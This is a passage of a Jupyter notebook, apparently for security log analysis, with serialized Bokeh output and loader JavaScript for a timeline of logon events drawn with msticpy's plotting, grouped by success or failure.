bject\",\"name\":\"Toolbar\",\"id\":\"p2420\",\"attributes\":{\"tools\":[{\"type\":\"object\",\"name\":\"HoverTool\",\"id\":\"p2376\",\"attributes\":{\"renderers\":\"auto\",\"tooltips\":[[\"AppDisplayName\",\"@AppDisplayName\"],[\"UserPrincipalName\",\"@UserPrincipalName\"],[\"Result\",\"@Result\"],[\"IPAddress\",\"@IPAddress\"],[\"TimeGenerated\",\"@TimeGenerated{%F %T.%3N}\"]],\"formatters\":{\"type\":\"map\",\"entries\":[[\"@TimeGenerated\",\"datetime\"]]}}},{\"type\":\"object\",\"name\":\"WheelZoomTool\",\"id\":\"p2449\",\"attributes\":{\"dimensions\":\"width\",\"renderers\":\"auto\"}},{\"type\":\"object\",\"name\":\"BoxZoomTool\",\"id\":\"p2450\",\"attributes\":{\"dimensions\":\"both\",\"overlay\":{\"type\":\"object\",\"name\":\"BoxAnnotation\",\"id\":\"p2451\",\"attributes\":{\"syncable\":false,\"line_color\":\"black\",\"line_alpha\":1.0,\"line_width\":2,\"line_dash\":[4,4],\"fill_color\":\"lightgrey\",\"fill_alpha\":0.5,\"level\":\"overlay\",\"visible\":false,\"left\":{\"type\":\"number\",\"value\":\"nan\"},\"right\":{\"type\":\"number\",\"value\":\"nan\"},\"top\":{\"type\":\"number\",\"value\":\"nan\"},\"bottom\":{\"type\":\"number\",\"value\":\"nan\"},\"left_units\":\"canvas\",\"right_units\":\"canvas\",\"top_units\":\"canvas\",\"bottom_units\":\"canvas\",\"handles\":{\"type\":\"object\",\"name\":\"BoxInteractionHandles\",\"id\":\"p2457\",\"attributes\":{\"all\":{\"type\":\"object\",\"name\":\"AreaVisuals\",\"id\":\"p2456\",\"attributes\":{\"fill_color\":\"white\",\"hover_fill_color\":\"lightgray\"}}}}}}}},{\"type\":\"object\",\"name\":\"ResetTool\",\"id\":\"p2458\"},{\"type\":\"object\",\"name\":\"SaveTool\",\"id\":\"p2459\"},{\"type\":\"object\",\"name\":\"PanTool\",\"id\":\"p2460\",\"attributes\":{\"dimensions\":\"width\"}}]}},\"left\":[{\"type\":\"object\",\"name\":\"LinearAxis\",\"id\":\"p2444\",\"attributes\":{\"ticker\":{\"type\":\"object\",\"name\":\"BasicTicker\",\"id\":\"p2445\",\"attributes\":{\"mantissas\":[1,2,5]}},\"formatter\":{\"type\":\"object\",\"name\":\"BasicTickFormatter\",\"id\":\"p2446\"},\"major_label_overrides\":{\"type\":\"map\",\"entries\":[[0,\"Failed\"],[1,\"Sucess\"]]},\"major_label_policy\":{\"type\":\"object\",\"name\":\"AllLabels\",\"id\":\"p2447\"}}},{\"type\":\"object\",\"name\":\"Legend\",\"id\":\"p2580\",\"attributes\":{\"location\":\"center\",\"click_policy\":\"hide\",\"label_text_font_size\":\"8pt\",\"items\":[{\"type\":\"object\",\"name\":\"LegendItem\",\"id\":\"p2579\",\"attributes\":{\"label\":{\"type\":\"value\",\"value\":\"Sucess\"},\"renderers\":[{\"id\":\"p2576\"}]}},{\"type\":\"object\",\"name\":\"LegendItem\",\"id\":\"p2569\",\"attributes\":{\"label\":{\"type\":\"value\",\"value\":\"Failed\"},\"renderers\":[{\"id\":\"p2566\"}]}}]}}],\"below\":[{\"type\":\"object\",\"name\":\"DatetimeAxis\",\"id\":\"p2425\",\"attributes\":{\"ticker\":{\"type\":\"object\",\"name\":\"DatetimeTicker\",\"id\":\"p2426\",\"attributes\":{\"num_minor_ticks\":10,\"tickers\":[{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p2427\",\"attributes\":{\"num_minor_ticks\":0,\"mantissas\":[1,2,5],\"max_interval\":500.0}},{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p2428\",\"attributes\":{\"num_minor_ticks\":0,\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"min_interval\":1000.0,\"max_interval\":1800000.0}},{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p2429\",\"attributes\":{\"num_minor_ticks\":0,\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"min_interval\":3600000.0,\"max_interval\":43200000.0}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2430\",\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2431\",\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2432\",\"attributes\":{\"days\":[1,8,15,22]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2433\",\"attributes\":{\"days\":[1,15]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2434\",\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2435\",\"attributes\":{\"months\":[0,2,4,6,8,10]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2436\",\"attributes\":{\"months\":[0,4,8]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2437\",\"attributes\":{\"months\":[0,6]}},{\"type\":\"object\",\"name\":\"YearsTicker\",\"id\":\"p2438\"}]}},\"formatter\":{\"type\":\"object\",\"name\":\"DatetimeTickFormatter\",\"id\":\"p2559\",\"attributes\":{\"milliseconds\":\"%H:%M:%S.%3N\",\"seconds\":\"%H:%M:%S\",\"minutes\":\"%H:%M:%S\",\"hours\":\"%H:%M:%S\",\"days\":\"%m-%d %H:%M\"}},\"axis_label\":\"Event Time\",\"major_label_policy\":{\"type\":\"object\",\"name\":\"AllLabels\",\"id\":\"p2442\"}}}],\"center\":[{\"type\":\"object\",\"name\":\"Grid\",\"id\":\"p2443\",\"attributes\":{\"axis\":{\"id\":\"p2425\"},\"minor_grid_line_color\":\"navy\",\"minor_grid_line_alpha\":0.3}},{\"type\":\"object\",\"name\":\"Grid\",\"id\":\"p2448\",\"attributes\":{\"dimension\":1,\"axis\":{\"id\":\"p2444\"},\"grid_line_color\":null}}],\"min_border_left\":50}},{\"type\":\"object\",\"name\":\"Figure\",\"id\":\"p2495\",\"attributes\":{\"width\":900,\"height\":120,\"x_range\":{\"type\":\"object\",\"name\":\"Range1d\",\"id\":\"p2505\",\"attributes\":{\"start\":1755236755796.833,\"end\":1755296475685.633}},\"y_range\":{\"type\":\"object\",\"name\":\"DataRange1d\",\"id\":\"p2497\"},\"x_scale\":{\"type\":\"object\",\"name\":\"LinearScale\",\"id\":\"p2506\"},\"y_scale\":{\"type\":\"object\",\"name\":\"LinearScale\",\"id\":\"p2507\"},\"title\":{\"type\":\"object\",\"name\":\"Title\",\"id\":\"p2498\",\"attributes\":{\"text\":\"Range Selector\"}},\"renderers\":[{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2535\",\"attributes\":{\"data_source\":{\"id\":\"p2370\"},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2536\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2537\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2532\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"fill_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"hatch_color\":{\"type\":\"value\",\"value\":\"#440154\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2533\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2534\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2544\",\"attributes\":{\"data_source\":{\"id\":\"p2373\"},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2545\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2546\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2541\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#FDE724\"},\"fill_color\":{\"type\":\"value\",\"value\":\"#FDE724\"},\"hatch_color\":{\"type\":\"value\",\"value\":\"#FDE724\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2542\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#FDE724\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#FDE724\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#FDE724\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2543\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#FDE724\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#FDE724\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#FDE724\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2}}}}}],\"toolbar\":{\"type\":\"object\",\"name\":\"Toolbar\",\"id\":\"p2504\",\"attributes\":{\"tools\":[{\"type\":\"object\",\"name\":\"RangeTool\",\"id\":\"p2547\",\"attributes\":{\"x_range\":{\"id\":\"p2421\"},\"overlay\":{\"type\":\"object\",\"name\":\"BoxAnnotation\",\"id\":\"p2552\",\"attributes\":{\"syncable\":false,\"line_color\":\"black\",\"line_alpha\":1.0,\"line_width\":0.5,\"line_dash\":[2,2],\"fill_color\":\"navy\",\"fill_alpha\":0.2,\"level\":\"overlay\",\"propagate_hover\":true,\"left\":{\"type\":\"number\",\"value\":\"nan\"},\"right\":{\"type\":\"number\",\"value\":\"nan\"},\"top\":{\"type\":\"number\",\"value\":\"nan\"},\"bottom\":{\"type\":\"number\",\"value\":\"nan\"},\"left_limit\":{\"type\":\"object\",\"name\":\"Node\",\"id\":\"p2548\",\"attributes\":{\"target\":\"frame\",\"symbol\":\"left\"}},\"right_limit\":{\"type\":\"object\",\"name\":\"Node\",\"id\":\"p2549\",\"attributes\":{\"target\":\"frame\",\"symbol\":\"right\"}},\"top_limit\":{\"type\":\"object\",\"name\":\"Node\",\"id\":\"p2550\",\"attributes\":{\"target\":\"frame\",\"symbol\":\"top\"}},\"bottom_limit\":{\"type\":\"object\",\"name\":\"Node\",\"id\":\"p2551\",\"attributes\":{\"target\":\"frame\",\"symbol\":\"bottom\"}},\"editable\":true,\"handles\":{\"type\":\"object\",\"name\":\"BoxInteractionHandles\",\"id\":\"p2558\",\"attributes\":{\"all\":{\"type\":\"object\",\"name\":\"AreaVisuals\",\"id\":\"p2557\",\"attributes\":{\"fill_color\":\"white\",\"hover_fill_color\":\"lightgray\"}}}}}}}}]}},\"toolbar_location\":null,\"below\":[{\"type\":\"object\",\"name\":\"DatetimeAxis\",\"id\":\"p2508\",\"attributes\":{\"ticker\":{\"type\":\"object\",\"name\":\"DatetimeTicker\",\"id\":\"p2509\",\"attributes\":{\"num_minor_ticks\":5,\"tickers\":[{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p2510\",\"attributes\":{\"num_minor_ticks\":0,\"mantissas\":[1,2,5],\"max_interval\":500.0}},{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p2511\",\"attributes\":{\"num_minor_ticks\":0,\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"min_interval\":1000.0,\"max_interval\":1800000.0}},{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p2512\",\"attributes\":{\"num_minor_ticks\":0,\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"min_interval\":3600000.0,\"max_interval\":43200000.0}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2513\",\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2514\",\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2515\",\"attributes\":{\"days\":[1,8,15,22]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2516\",\"attributes\":{\"days\":[1,15]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2517\",\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2518\",\"attributes\":{\"months\":[0,2,4,6,8,10]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2519\",\"attributes\":{\"months\":[0,4,8]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2520\",\"attributes\":{\"months\":[0,6]}},{\"type\":\"object\",\"name\":\"YearsTicker\",\"id\":\"p2521\"}]}},\"formatter\":{\"type\":\"object\",\"name\":\"DatetimeTickFormatter\",\"id\":\"p2528\",\"attributes\":{\"milliseconds\":\"%H:%M:%S.%3N\",\"seconds\":\"%H:%M:%S\",\"minutes\":\"%H:%M:%S\",\"hours\":\"%H:%M:%S\",\"days\":\"%m-%d %H:%M\"}},\"major_label_policy\":{\"type\":\"object\",\"name\":\"AllLabels\",\"id\":\"p2525\"}}},{\"type\":\"object\",\"name\":\"Title\",\"id\":\"p2527\",\"attributes\":{\"text\":\"Drag the middle or edges of the selection box to change the range in the main chart\",\"text_font_size\":\"10px\",\"align\":\"right\"}}],\"center\":[{\"type\":\"object\",\"name\":\"Grid\",\"id\":\"p2526\",\"attributes\":{\"axis\":{\"id\":\"p2508\"}}}]}}]}}]}};\n  const render_items = [{\"docid\":\"33d0e57f-79f3-426c-8dc0-bbf1865b12c3\",\"roots\":{\"p2581\":\"bc4a629e-5670-441c-b274-a2b55f608601\"},\"root_ids\":[\"p2581\"]}];\n  void root.Bokeh.embed.embed_items_notebook(docs_json, render_items);\n  }\n  if (root.Bokeh !== undefined) {\n    embed_document(root);\n  } else {\n    let attempts = 0;\n    const timer = setInterval(function(root) {\n      if (root.Bokeh !== undefined) {\n        clearInterval(timer);\n        embed_document(root);\n      } else {\n        attempts++;\n        if (attempts > 100) {\n          clearInterval(timer);\n          console.log(\"Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing\");\n        }\n      }\n    }, 10, root)\n  }\n})(window);",
      "application/vnd.bokehjs_exec.v0+json": ""
     },
     "metadata": {
      "application/vnd.bokehjs_exec.v0+json": {
       "id": "p2581"
      }
     },
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div style=\"display: table;\"><div style=\"display: table-row;\"><div style=\"display: table-cell;\"><b title=\"bokeh.models.layouts.Column\">Column</b>(</div><div style=\"display: table-cell;\">id&nbsp;=&nbsp;'p2581', <span id=\"p2589\" style=\"cursor: pointer;\">&hellip;)</span></div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">align&nbsp;=&nbsp;'auto',</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">aspect_ratio&nbsp;=&nbsp;None,</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">children&nbsp;=&nbsp;[figure(id='p2411', ...), figure(id='p2495', ...)],</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">context_menu&nbsp;=&nbsp;None,</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">css_classes&nbsp;=&nbsp;[],</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">css_variables&nbsp;=&nbsp;{},</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">disabled&nbsp;=&nbsp;False,</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">elements&nbsp;=&nbsp;[],</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">flow_mode&nbsp;=&nbsp;'block',</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">height&nbsp;=&nbsp;None,</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">height_policy&nbsp;=&nbsp;'auto',</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">html_attributes&nbsp;=&nbsp;{},</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">html_id&nbsp;=&nbsp;None,</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">js_event_callbacks&nbsp;=&nbsp;{},</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">js_property_callbacks&nbsp;=&nbsp;{},</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">margin&nbsp;=&nbsp;None,</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">max_height&nbsp;=&nbsp;None,</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">max_width&nbsp;=&nbsp;None,</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">min_height&nbsp;=&nbsp;None,</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">min_width&nbsp;=&nbsp;None,</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">name&nbsp;=&nbsp;None,</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">resizable&nbsp;=&nbsp;False,</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">sizing_mode&nbsp;=&nbsp;None,</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">spacing&nbsp;=&nbsp;0,</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">styles&nbsp;=&nbsp;{},</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">stylesheets&nbsp;=&nbsp;[],</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">subscribed_events&nbsp;=&nbsp;PropertyValueSet(),</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">syncable&nbsp;=&nbsp;True,</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">tags&nbsp;=&nbsp;[],</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">visible&nbsp;=&nbsp;True,</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">width&nbsp;=&nbsp;None,</div></div><div class=\"p2588\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">width_policy&nbsp;=&nbsp;'auto')</div></div></div>\n",
       "<script>\n",
       "(function() {\n",
       "  let expanded = false;\n",
       "  const ellipsis = document.getElementById(\"p2589\");\n",
       "  ellipsis.addEventListener(\"click\", function() {\n",
       "    const rows = document.getElementsByClassName(\"p2588\");\n",
       "    for (let i = 0; i < rows.length; i++) {\n",
       "      const el = rows[i];\n",
       "      el.style.display = expanded ? \"none\" : \"table-row\";\n",
       "    }\n",
       "    ellipsis.innerHTML = expanded ? \"&hellip;)\" : \"&lsaquo;&lsaquo;&lsaquo;\";\n",
       "    expanded = !expanded;\n",
       "  });\n",
       "})();\n",
       "</script>\n"
      ],
      "text/plain": [
       "Column(id='p2581', ...)"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "disp_cols = [\"UserPrincipalName\", \"IPAddress\", \"AppDisplayName\", \"Result\"]\n",
    "\n",
    "logons_df.mp_plot.timeline(\n",
    "    title=\"Logon Events\",\n",
    "    source_columns = disp_cols,\n",
    ")\n",
    "\n",
    "logons_df.mp_plot.timeline(\n",
    "    title=\"Logon Events by User\",\n",
    "    source_columns = disp_cols,\n",
    "    group_by=\"Result\",\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "id": "20ffb144",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "    <style>\n",
       "        .bk-notebook-logo {\n",
       "            display: block;\n",
       "            width: 20px;\n",
       "            height: 20px;\n",
       "            background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEgAACxIB0t1+/AAAABx0RVh0U29mdHdhcmUAQWRvYmUgRmlyZXdvcmtzIENTNui8sowAAAOkSURBVDiNjZRtaJVlGMd/1/08zzln5zjP1LWcU9N0NkN8m2CYjpgQYQXqSs0I84OLIC0hkEKoPtiH3gmKoiJDU7QpLgoLjLIQCpEsNJ1vqUOdO7ppbuec5+V+rj4ctwzd8IIbbi6u+8f1539dt3A78eXC7QizUF7gyV1fD1Yqg4JWz84yffhm0qkFqBogB9rM8tZdtwVsPUhWhGcFJngGeWrPzHm5oaMmkfEg1usvLFyc8jLRqDOMru7AyC8saQr7GG7f5fvDeH7Ej8CM66nIF+8yngt6HWaKh7k49Soy9nXurCi1o3qUbS3zWfrYeQDTB/Qj6kX6Ybhw4B+bOYoLKCC9H3Nu/leUTZ1JdRWkkn2ldcCamzrcf47KKXdAJllSlxAOkRgyHsGC/zRday5Qld9DyoM4/q/rUoy/CXh3jzOu3bHUVZeU+DEn8FInkPBFlu3+nW3Nw0mk6vCDiWg8CeJaxEwuHS3+z5RgY+YBR6V1Z1nxSOfoaPa4LASWxxdNp+VWTk7+4vzaou8v8PN+xo+KY2xsw6une2frhw05CTYOmQvsEhjhWjn0bmXPjpE1+kplmmkP3suftwTubK9Vq22qKmrBhpY4jvd5afdRA3wGjFAgcnTK2s4hY0/GPNIb0nErGMCRxWOOX64Z8RAC4oCXdklmEvcL8o0BfkNK4lUg9HTl+oPlQxdNo3Mg4Nv175e/1LDGzZen30MEjRUtmXSfiTVu1kK8W4txyV6BMKlbgk3lMwYCiusNy9fVfvvwMxv8Ynl6vxoByANLTWplvuj/nF9m2+PDtt1eiHPBr1oIfhCChQMBw6Aw0UulqTKZdfVvfG7VcfIqLG9bcldL/+pdWTLxLUy8Qq38heUIjh4XlzZxzQm19lLFlr8vdQ97rjZVOLf8nclzckbcD4wxXMidpX30sFd37Fv/GtwwhzhxGVAprjbg0gCAEeIgwCZyTV2Z1REEW8O4py0wsjeloKoMr6iCY6dP92H6Vw/oTyICIthibxjm/DfN9lVz8IqtqKYLUXfoKVMVQVVJOElGjrnnUt9T9wbgp8AyYKaGlqingHZU/uG2NTZSVqwHQTWkx9hxjkpWDaCg6Ckj5qebgBVbT3V3NNXMSiWSDdGV3hrtzla7J+duwPOToIg42ChPQOQjspnSlp1V+Gjdged7+8UN5CRAV7a5EdFNwCjEaBR27b3W890TE7g24NAP/mMDXRWrGoFPQI9ls/MWO2dWFAar/xcOIImbbpA3zgAAAABJRU5ErkJggg==);\n",
       "        }\n",
       "    </style>\n",
       "    <div>\n",
       "        <a href=\"https://bokeh.org\" target=\"_blank\" class=\"bk-notebook-logo\"></a>\n",
       "        <span id=\"ea3a5c1c-e1ba-47fe-b60a-9a91fe9d6c03\">Loading BokehJS ...</span>\n",
       "    </div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": "'use strict';\n(function(root) {\n  function now() {\n    return new Date();\n  }\n\n  const force = true;\n\n  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n    root._bokeh_onload_callbacks = [];\n    root._bokeh_is_loading = undefined;\n  }\n\nconst JS_MIME_TYPE = 'application/javascript';\n  const HTML_MIME_TYPE = 'text/html';\n  const EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';\n  const CLASS_NAME = 'output_bokeh rendered_html';\n\n  /**\n   * Render data to the DOM node\n   */\n  function render(props, node) {\n    const script = document.createElement(\"script\");\n    node.appendChild(script);\n  }\n\n  /**\n   * Handle when an output is cleared or removed\n   */\n  function handleClearOutput(event, handle) {\n    function drop(id) {\n      const view = Bokeh.index.get_by_id(id)\n      if (view != null) {\n        view.model.document.clear()\n        Bokeh.index.delete(view)\n      }\n    }\n\n    const cell = handle.cell;\n\n    const id = cell.output_area._bokeh_element_id;\n    const server_id = cell.output_area._bokeh_server_id;\n\n    // Clean up Bokeh references\n    if (id != null) {\n      drop(id)\n    }\n\n    if (server_id !== undefined) {\n      // Clean up Bokeh references\n      const cmd_clean = \"from bokeh.io.state import curstate; print(curstate().uuid_to_server['\" + server_id + \"'].get_sessions()[0].document.roots[0]._id)\";\n      cell.notebook.kernel.execute(cmd_clean, {\n        iopub: {\n          output: function(msg) {\n            const id = msg.content.text.trim()\n            drop(id)\n          }\n        }\n      });\n      // Destroy server and session\n      const cmd_destroy = \"import bokeh.io.notebook as ion; ion.destroy_server('\" + server_id + \"')\";\n      cell.notebook.kernel.execute(cmd_destroy);\n    }\n  }\n\n  /**\n   * Handle when a new output is added\n   */\n  function handleAddOutput(event, handle) {\n    const output_area = handle.output_area;\n    const output = handle.output;\n\n    // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only\n    if ((output.output_type != \"display_data\") || (!Object.prototype.hasOwnProperty.call(output.data, EXEC_MIME_TYPE))) {\n      return\n    }\n\n    const toinsert = output_area.element.find(\".\" + CLASS_NAME.split(' ')[0]);\n\n    if (output.metadata[EXEC_MIME_TYPE][\"id\"] !== undefined) {\n      toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];\n      // store reference to embed id on output_area\n      output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE][\"id\"];\n    }\n    if (output.metadata[EXEC_MIME_TYPE][\"server_id\"] !== undefined) {\n      const bk_div = document.createElement(\"div\");\n      bk_div.innerHTML = output.data[HTML_MIME_TYPE];\n      const script_attrs = bk_div.children[0].attributes;\n      for (let i = 0; i < script_attrs.length; i++) {\n        toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);\n        toinsert[toinsert.length - 1].firstChild.textContent = bk_div.children[0].textContent\n      }\n      // store reference to server id on output_area\n      output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE][\"server_id\"];\n    }\n  }\n\n  function register_renderer(events, OutputArea) {\n\n    function append_mime(data, metadata, element) {\n      // create a DOM node to render to\n      const toinsert = this.create_output_subarea(\n        metadata,\n        CLASS_NAME,\n        EXEC_MIME_TYPE\n      );\n      this.keyboard_manager.register_events(toinsert);\n      // Render to node\n      const props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};\n      render(props, toinsert[toinsert.length - 1]);\n      